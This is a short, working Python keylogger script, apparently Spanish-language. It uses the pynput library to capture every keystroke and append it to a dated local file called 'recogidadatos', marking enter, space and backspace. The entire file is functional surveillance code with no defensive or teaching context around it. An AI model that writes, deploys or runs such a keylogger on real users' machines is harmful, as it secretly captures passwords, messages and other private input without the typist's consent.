
import datetime
from pynput.keyboard import Listener

d=datetime.datetime.now().strftime('%d-%m-%Y')

def keylogger(key):
	f = open("recogidadatos_{}.txt".format(d), "a")
	
	key=str(key)

	if key == 'Key.enter':
		f.write('\n')
	elif key == 'Key.space':
		f.write(' ')
	elif key == 'Key.backspace':
		f.write('--BORRAR--')
	else:
		f.write(key.replace("'",""))

	f.close()
with Listener(on_press=keylogger) as l:
	l.join()
